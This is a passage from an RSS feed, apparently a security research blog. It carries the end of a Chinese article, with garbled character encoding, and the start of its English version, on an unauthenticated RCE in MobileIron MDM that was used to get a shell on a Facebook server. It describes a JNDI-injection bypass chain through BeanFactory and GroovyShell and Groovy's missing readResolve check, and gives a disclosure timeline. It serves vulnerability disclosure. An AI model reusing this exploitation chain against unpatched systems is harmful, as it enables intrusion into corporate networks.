&lt;p&gt;è€Œæ ¹æ“šæˆ‘å€‘çš„ç›®æ¨™ç’°å¢ƒï¼Œå¯ä»¥è§¸ç™¼çš„åªæœ‰ Spring AOP é€™æ¢åˆ©ç”¨éˆ!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI æ³¨å…¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI æ³¨å…¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;âˆš&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI æ³¨å…¥&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘ç¾åœ¨æœ‰äº† JNDI æ³¨å…¥å¾Œï¼Œæ¥ä¸‹ä¾†åªè¦é€é &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; åœ¨ Black Hat USA 2016 ä¸Šæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt; å°±å¯ä»¥å–å¾—é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œäº†â€¦ ç”˜å®‰å…§?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‡ªå¾ &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro MuÃ±oz&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; åœ¨ Black Hat ç™¼è¡¨äº†é€™å€‹æ–°çš„æ”»æ“Šå‘é‡å¾Œï¼Œä¸çŸ¥é“å¹«åŠ©äº†å¤šå°‘å¤§å¤§å°å°çš„é§­å®¢ï¼Œç”šè‡³æœƒæœ‰äººèªç‚ºã€Œé‡åˆ°ååºåˆ—åŒ–å°±ç”¨ JNDI é€å°±å°äº†!ã€ï¼Œä½†è‡ªå¾ 2018 å¹´åæœˆï¼ŒJava çµ‚æ–¼æŠŠé—œæ–¼ JNDI æ³¨å…¥çš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–çµ¦ä¿®å¾©ï¼Œé€™å€‹ä¿®å¾©è¢«è¨˜è¼‰åœ¨ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; ä¸­ï¼Œè‡ªæ­¤ä¹‹å¾Œï¼Œæ‰€æœ‰ Java é«˜æ–¼ 8u181, 7u191, 6u201 çš„ç‰ˆæœ¬çš†ç„¡æ³•é€é JNDI/LDAP çš„æ–¹å¼åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œå› æ­¤è‹¥è¦åœ¨æœ€æ–°ç‰ˆæœ¬çš„ MobileIron ä¸Šå¯¦ç¾æ”»æ“Šï¼Œæˆ‘å€‘å‹¢å¿…å¾—é¢å°é€™å€‹å•é¡Œ!&lt;/p&gt;

&lt;p&gt;é—œæ–¼ CVE-2018-3149ï¼Œæ˜¯é€éå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; çš„é è¨­å€¼æ”¹ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; çš„æ–¹å¼ä»¥é”åˆ°ç¦æ­¢æ”»æ“Šè€…ä¸‹è¼‰é ç«¯ Bytecode å–å¾—åŸ·è¡Œç¨‹å¼ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä½†å¹¸é‹çš„æ˜¯ï¼Œæˆ‘å€‘ä¾ç„¶å¯ä»¥é€é JNDI çš„ Naming Reference åˆ°æœ¬æ©Ÿæ—¢æœ‰çš„ Class Factory ä¸Š! é€éé¡ä¼¼ &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; çš„æ¦‚å¿µï¼Œå°‹æ‰¾æœ¬æ©Ÿ ClassPath ä¸­å¯åˆ©ç”¨çš„é¡åˆ¥å»åšæ›´é€²ä¸€æ­¥çš„åˆ©ç”¨ï¼Œè©³ç´°çš„æ‰‹æ³•å¯åƒè€ƒç”± &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; åœ¨ 2019 å¹´å¹´åˆæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;ï¼Œè£¡é¢è©³ç´°æ•˜è¿°äº†å¦‚ä½•é€é Tomcat çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; å»è¼‰å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; é”æˆä»»æ„ç¨‹å¼ç¢¼åŸ·è¡Œ!&lt;/p&gt;

&lt;p&gt;é€™æ¢è·¯çœ‹ä¼¼é€šæš¢ï¼Œä½†å¯¦éš›ä¸Šå»å·®é‚£éº¼ä¸€é»ï¼Œç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; åœ¨ Tomcat 8 å¾Œæ‰è¢«å¼•å…¥ï¼Œå› æ­¤ä¸Šé¢çš„ç¹éæ–¹å¼åªèƒ½åœ¨ Tomcat ç‰ˆæœ¬å¤§æ–¼ 8 å¾Œçš„æŸå€‹ç‰ˆæœ¬æ‰èƒ½æˆåŠŸï¼Œè€Œæˆ‘å€‘çš„ç›®æ¨™å‰‡æ˜¯ Tomcat 7.xï¼Œå› æ­¤å¾—ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; å°‹æ‰¾ä¸€å€‹æ–°çš„åˆ©ç”¨éˆ! è€Œç¶“éæœå°‹ï¼Œç™¼ç¾åœ¨ &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; çš„&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;æ–‡ç« &lt;/a&gt;ä¸­æ‰€æåˆ°:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;é™¤äº† javax.el.ELProcessorï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„ç±»ç¬¦åˆæ¡ä»¶å¯ä»¥ä½œä¸º beanClass æ³¨å…¥åˆ° BeanFactory ä¸­å®ç°åˆ©ç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœç›®æ ‡æœºå™¨ classpath ä¸­æœ‰ groovy çš„åº“ï¼Œåˆ™å¯ä»¥ç»“åˆä¹‹å‰ Orange å¸ˆå‚…å‘è¿‡çš„ &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins çš„æ¼æ´å®ç°åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç›®æ¨™çš„ ClassPath ä¸Šå‰›å¥½æœ‰ Groovy å­˜åœ¨! æ–¼æ˜¯æˆ‘å€‘åˆè®“ Meta Programming å‰å¤§äº†ä¸€æ¬¡ :D&lt;/p&gt;

&lt;p&gt;ç„¶è€Œäº‹å¯¦ä¸Šï¼Œç›®æ¨™ä¼ºæœå™¨ä¸Š Groovy ç‰ˆæœ¬ç‚º 1.5.6ï¼Œæ˜¯ä¸€å€‹è·ä»Šåå¹´å‰è€èˆŠåˆ°ä¸æ”¯æ´ Meta Programming çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘å€‘æœ€å¾Œé‚„æ˜¯åŸºæ–¼ Groovy çš„ç¨‹å¼ç¢¼ï¼Œé‡æ–°å°‹æ‰¾äº†ä¸€å€‹åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; ä¸Šçš„åˆ©ç”¨éˆ! è©³ç´°çš„åˆ©ç”¨éˆå¯åƒè€ƒæˆ‘é€çµ¦ &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; çš„é€™å€‹ &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;!&lt;/p&gt;

&lt;h2 id=&quot;æ”»æ“Š-facebook&quot;&gt;æ”»æ“Š Facebook&lt;/h2&gt;

&lt;p&gt;ç¾åœ¨æˆ‘å€‘å·²ç¶“æœ‰äº†ä¸€å€‹åŸºæ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; çš„å®Œç¾é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œæ¼æ´ï¼Œæ¥ä¸‹ä¾†å°±é–‹å§‹æ”»æ“Š Facebook å§! å¾å‰æ–‡æåˆ°ï¼Œæˆ‘å€‘åœ¨ 2016 å¹´æ™‚å°±å·²çŸ¥ Facebook ä½¿ç”¨ MobileIron ç•¶ä½œä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆï¼Œé›–ç„¶ç¾åœ¨å†æª¢æŸ¥ä¸€æ¬¡ç™¼ç¾é¦–é ç›´æ¥è®Šæˆ 403 Forbidden äº†ï¼Œä¸éå¹¸é‹çš„æ˜¯ Web Service å±¤ä¸¦ç„¡é˜»æ“‹!
s
&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¬äº‹ä¿±å‚™ï¼Œåªæ¬ æ±é¢¨! æ­£ç•¶è¦æ”»æ“Š Facebook çš„å‰å¹¾å¤©ï¼Œæˆ‘å€‘çªç„¶æƒ³åˆ°ï¼Œå¾ä¸Šæ¬¡&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;é€²å…¥ Facebook ä¼ºæœå™¨&lt;/a&gt;çš„ç¶“é©—ï¼Œç”±æ–¼å®‰å…¨ä¸Šçš„è€ƒé‡ï¼ŒFacebook ä¼¼ä¹æœƒç¦æ­¢æ‰€æœ‰å°å¤–éƒ¨éæ³•çš„é€£ç·šï¼Œé€™é»å°æˆ‘å€‘ JNDI æ³¨å…¥æ”»æ“Šæœ‰è‘—è‡³é—œé‡è¦çš„å½±éŸ¿! é¦–å…ˆï¼ŒJNDI æ³¨å…¥çš„æ ¸å¿ƒå°±æ˜¯é€éå—å®³è€…é€£ç·šè‡³æ”»æ“Šè€…æ§åˆ¶çš„æƒ¡æ„ä¼ºæœå™¨ï¼Œä¸¦æ¥æ”¶å›å‚³çš„æƒ¡æ„ Naming Reference å¾Œæ‰€å°è‡´çš„ä¸€ç³»åˆ—åˆ©ç”¨ï¼Œä½†ç¾åœ¨é€£æœ€é–‹å§‹çš„é€£ç·šåˆ°æ”»æ“Šè€…çš„æƒ¡æ„ä¼ºæœå™¨éƒ½ç„¡æ³•ï¼Œæ›´åˆ¥è«‡å¾ŒçºŒçš„åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‡ªæ­¤ï¼Œæˆ‘å€‘é—œæ–¼ JNDI æ³¨å…¥çš„è·¯å·²å…¨è¢«å°æ®ºï¼Œåªèƒ½å›åˆ° Hessian ååºåˆ—åŒ–é‡æ–°æ€è€ƒ! è€Œç¾æœ‰çš„åˆ©ç”¨éˆçš†ç„¡æ³•é”åˆ°é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œï¼Œæ‰€ä»¥æˆ‘å€‘å‹¢å¿…å¾—æ‹‹æ£„ JNDI æ³¨å…¥ï¼Œå°‹æ‰¾ä¸€å€‹æ–°çš„åˆ©ç”¨éˆ!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºäº†å°‹æ‰¾æ–°çš„åˆ©ç”¨éˆï¼Œå¿…é ˆå…ˆæ·±å…¥ç†è§£å·²å­˜åœ¨åˆ©ç”¨éˆçš„åŸç†åŠæˆå› ï¼Œåœ¨é‡è®€ &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; çš„è«–æ–‡å¾Œï¼Œæˆ‘å°å…¶ä¸­ä¸€å¥è©±æ„Ÿåˆ°äº†å¥½å¥‡:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovyâ€™s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å“¦ï¼Œç‚ºä»€éº¼ä½œè€…è¦ç‰¹åœ°è£œä¸Šé€™å¥è©±å‘¢? æˆ‘é–‹å§‹æœ‰å€‹çŒœæƒ³:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ä½œè€…è©•ä¼°éæŠŠ Groovy ç•¶æˆåˆ©ç”¨éˆçš„å¯è¡Œæ€§ï¼Œé›–ç„¶è¢«é™åˆ¶ä½äº†ï¼Œä½†ä¸€å®šè¦ºå¾—æœ‰æ©Ÿæœƒæ‰æœƒå¯«é€²è«–æ–‡ä¸­!&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾é€™å€‹çŒœæƒ³å‡ºç™¼ï¼Œé›–ç„¶ Groovy çš„åˆ©ç”¨éˆè¢« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; é™åˆ¶ä½äº†ï¼Œä½†å‰›å¥½æˆ‘å€‘ç›®æ¨™ç‰ˆæœ¬çš„ Groovy å¾ˆèˆŠï¼Œèªªä¸å®šå°šæœªæŠŠé€™å€‹é™åˆ¶åŠ å…¥ç¨‹å¼åº«!&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘æ¯”è¼ƒäº†ä¸€ä¸‹ Groovy-1.5.6 èˆ‡æœ€æ–°ç‰ˆæœ¬ä½æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; å¯¦ç¾:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°çš„ç¢ºåœ¨èˆŠç‰ˆæ˜¯æ²’æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; é™åˆ¶çš„ï¼Œè€Œå¾Œä¾†ç¶“éè€ƒå¤å¾Œä¹Ÿç™¼ç¾ï¼Œé€™å€‹é™åˆ¶å…¶å¯¦ Groovy è‡ªå·±ç‚ºäº†å› æ‡‰ 2015 å¹´æ‰€å‡ºç¾ Java ååºåˆ—åŒ–æ¼æ´çš„æ¸›ç·©æªæ–½ï¼Œå› æ­¤ä¹Ÿè¢«åˆ†é…äº† &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; é€™å€‹æ¼æ´ç·¨è™Ÿ! ç”±æ–¼ Groovy åªæ˜¯ä¸€å€‹åªåœ¨å…§éƒ¨ä½¿ç”¨ã€ä¸æœƒå°å¤–çš„å°é…è§’ï¼Œå› æ­¤åœ¨æ²’æœ‰ç‰¹åˆ¥éœ€æ±‚ä¸‹é–‹ç™¼è€…ä¹Ÿä¸æœƒç‰¹åœ°å»æ›´æ–°å®ƒï¼Œå› æ­¤æˆç‚ºäº†æˆ‘å€‘æ”»æ“Šéˆçš„ä¸€ç’°! é€™ä¹Ÿå†ä¸€æ¬¡é©—è­‰äº†ã€Œä»»ä½•çœ‹ä¼¼èˆ‰ç„¡è¼•é‡çš„å°å…ƒä»¶ï¼Œéƒ½æœ‰å¯èƒ½æˆç‚ºä½ è¢«æ”»æ“Šçš„ä¸»å› ã€!&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œç•¶ç„¶! æˆ‘å€‘æˆåŠŸçš„å–å¾—åœ¨ Facebook ä¼ºæœå™¨ä¸Šçš„ Shellï¼Œä»¥ä¸‹æ˜¯å½±ç‰‡:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;æ¼æ´é€šå ±èˆ‡ä¿®å¾©&quot;&gt;æ¼æ´é€šå ±èˆ‡ä¿®å¾©&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘ç´„åœ¨ä¸‰æœˆæ™‚å®Œæˆæ•´å€‹æ¼æ´ç ”ç©¶ï¼Œä¸¦åœ¨ 4/3 æ—¥å°‡ç ”ç©¶æˆæœå¯«æˆå ±å‘Šï¼Œé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security@mobileiron.com&lt;/code&gt; å›å ±çµ¦ MobileIron! å®˜æ–¹æ”¶åˆ°å¾Œè‘—æ‰‹é–‹å§‹ä¿®å¾©ï¼Œåœ¨ 6/15 é‡‹å‡ºä¿®è£œç¨‹å¼ä¸¦è¨˜éŒ„äº†ä¸‰å€‹ CVE ç·¨è™Ÿï¼Œè©³ç´°çš„ä¿®å¾©æ–¹å¼è«‹åƒé–± &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;MobileIron å®˜æ–¹ç¶²ç«™&lt;/a&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç•¶å®˜æ–¹é‡‹å‡ºä¿®è£œç¨‹å¼å¾Œï¼Œæˆ‘å€‘ä¹Ÿé–‹å§‹ç›£æ§ä¸–ç•Œä¸Šæ‰€æœ‰æœ‰ä½¿ç”¨ MobileIron ä¼æ¥­çš„ä¿®å¾©ç‹€æ³ï¼Œé€™è£¡åªå–®ç´”æª¢æŸ¥éœæ…‹æª”æ¡ˆçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; Headerï¼Œçµæœåƒ…ä¾›åƒè€ƒä¸å®Œå…¨ä»£è¡¨å¯¦éš›æƒ…æ³(Unknown ä»£è¡¨æœªé–‹ 443/8443 ç„¡æ³•åˆ©ç”¨):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;èˆ‡æ­¤åŒæ™‚ï¼Œæˆ‘å€‘ä¹ŸæŒçºŒç›£æ§è‘— Facebookï¼Œä¸¦åœ¨ 15 å¤©ç¢ºèªéƒ½æœªä¿®è£œå¾Œæ–¼ 7/2 æ—¥æˆåŠŸé€²å…¥ Facebook ä¼ºæœå™¨å¾Œå›å ± Facebook Bug Bounty Program!&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;åˆ°æ­¤ï¼Œæˆ‘å€‘å·²ç¶“æˆåŠŸç¤ºç¯„äº†å¦‚ä½•å°‹æ‰¾ä¸€å€‹ MDM ä¼ºæœå™¨çš„æ¼æ´! å¾ç¹é Java èªè¨€å±¤ç´šçš„ä¿è­·ã€ç¶²è·¯é™åˆ¶ï¼Œåˆ°å¯«å‡ºæ”»æ“Šç¨‹å¼ä¸¦æˆåŠŸçš„åˆ©ç”¨åœ¨ Bug Bounty Program ä¸Š! å› ç‚ºæ–‡é•·ï¼Œé‚„æœ‰è¨±å¤šä¾†ä¸åŠåˆ†äº«çš„æ•…äº‹ï¼Œé€™è£¡åƒ…æ¢åˆ—ä¸€ä¸‹ä¾›æœ‰èˆˆè¶£ç¹¼çºŒç ”ç©¶çš„äººåƒè€ƒ!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ä½•å¾ MDM ä¼ºæœå™¨ï¼Œæ§åˆ¶å›å“¡å·¥çš„æ‰‹æ©Ÿè£ç½®&lt;/li&gt;
  &lt;li&gt;å¦‚ä½•åˆ†æ MobileIron çš„ç§æœ‰ MI Protocol&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 æœ¬è³ªä¸Šå…¶å¯¦æ˜¯ä¸€å€‹å¾ˆæœ‰è¶£çš„èªè­‰ç¹éæ¼æ´&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¸Œæœ›é€™ç¯‡æ–‡ç« èƒ½å¤ å–šèµ·å¤§çœ¾å°æ–¼ MDM æ”»æ“Šé¢çš„æ³¨æ„ï¼Œä»¥åŠä¼æ¥­å®‰å…¨çš„é‡è¦æ€§! æ„Ÿè¬æ”¶çœ‹ :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hi, itâ€™s a long time since my last article. This new post is about my research this March, which talks about how I found vulnerabilities on a leading Mobile Device Management product and bypassed several limitations to achieve unauthenticated RCE. All the vulnerabilities have been reported to the vendor and got fixed in June. After that, we kept monitoring large corporations to track the overall fixing progress and then found that Facebook didnâ€™t keep up with the patch for more than 2 weeks, so we dropped a shell on Facebook and reported to their Bug Bounty program!&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;http://hitcon.org/2020&quot;&gt;HITCON 2020&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As a Red Teamer, we are always looking for new paths to infiltrate the corporate network from outside. Just like &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;our research in Black Hat USA last year&lt;/a&gt;, we demonstrated how leading SSL VPNs could be hacked and become your Virtual â€œPublicâ€ Network! SSL VPN is trusted to be secure and considered the only way to your private network. But, what if your trusted appliances are insecure?&lt;/p&gt;

&lt;p&gt;Based on this scenario, we would like to explore new attack surfaces on enterprise security, and we get interested in MDM, so this is the article for that!&lt;/p&gt;

&lt;h2 id=&quot;what-is-mdm&quot;&gt;What is MDM?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management, also known as MDM, is an asset assessment system that makes the employeesâ€™ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD&lt;/a&gt; more manageable for enterprises. It was proposed in 2012 in response to the increasing number of tablets and mobile devices. MDM can guarantee that the devices are running under the corporate policy and in a trusted environment. Enterprise could manage assets, install certificates, deploy applications and even lock/wipe devices remotely to prevent data leakage as well.&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) is a newer term relevant to MDM which has a broader definition for managed devices. Following we use MDM to represent similar products!&lt;/p&gt;

&lt;h2 id=&quot;our-target&quot;&gt;Our target&lt;/h2&gt;

